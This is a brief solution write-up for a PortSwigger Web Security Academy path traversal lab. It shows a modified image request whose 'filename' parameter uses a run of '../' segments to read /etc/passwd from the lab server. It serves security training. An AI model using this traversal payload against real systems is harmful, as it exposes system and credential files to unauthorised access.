# Lab: simple case

**Link**: https://portswigger.net/web-security/file-path-traversal/lab-simple

**Solution**:
find the request who get the file (image)

<p align="center" width="100%">
  <img src="image1.png" width="800" hight="500"/>
</p>


Take the request copy and modify `filename` parameter

https://0afc00a00467605ec4997d9c008b005d.web-security-academy.net/image?filename=6.jpg
to be
[https://0afc00a00467605ec4997d9c008b005d.web-security-academy.net/image?filename=](https://0afc00a00467605ec4997d9c008b005d.web-security-academy.net/image?filename=6.jpg)../../../../../../../../../../../../etc/passwd

<p align="center" width="100%">
  <img src="image2.png" width="500" hight="500"/>
</p>


<p align="center" width="100%">
  <img src="image3.png" width="500" hight="500"/>
</p>
